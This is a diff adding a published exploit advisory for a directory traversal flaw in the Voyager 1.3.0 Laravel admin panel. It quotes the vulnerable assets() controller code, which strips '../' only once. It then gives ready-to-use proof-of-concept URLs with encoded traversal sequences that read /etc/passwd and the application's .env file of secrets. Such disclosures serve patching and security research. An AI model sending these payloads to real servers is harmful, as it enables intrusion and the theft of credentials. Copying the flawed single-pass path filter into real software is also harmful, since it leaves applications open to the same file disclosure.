@@ -1,0 +1,50 @@
+# Exploit Title: Voyager 1.3.0 - Directory Traversal
+# Google Dork: N/A
+# Date: January 2020-01-06
+# Exploit Author: NgoAnhDuc
+# Vendor Homepage: https://voyager.devdojo.com/
+# Software Link:https://github.com/the-control-group/voyager/releases/tag/v1.3.0https://github.com/the-control-group/voyager/releases/tag/v1.2.7
+# Version: 1.3.0 and bellow
+# Tested on: Ubuntu 18.04
+# CVE : N/A
+
+
+Vulnerable code is in voyager/src/Http/Controllers/VoyagerController.php
+
+========================================
+
+public function assets(Request $request)
+    {
+        *$path = str_start(str_replace(['../', './'], '',
+urldecode($request->path)), '/');*
+*        $path = base_path('vendor/tcg/voyager/publishable/assets'.$path);*
+        if (File::exists($path)) {
+            $mime = '';
+            if (ends_with($path, '.js')) {
+                $mime = 'text/javascript';
+            } elseif (ends_with($path, '.css')) {
+                $mime = 'text/css';
+            } else {
+                $mime = File::mimeType($path);
+            }
+            $response = response(File::get($path), 200,
+['Content-Type' => $mime]);
+            $response->setSharedMaxAge(31536000);
+            $response->setMaxAge(31536000);
+            $response->setExpires(new \DateTime('+1 year'));
+            return $response;
+        }
+        return response('', 404);
+    }
+========================================
+
+PoC:
+
+passwd:
+
+http://localhost/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd
+
+
+Laravel environment
+file:http://localhost/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F<web
+root dir>/.env
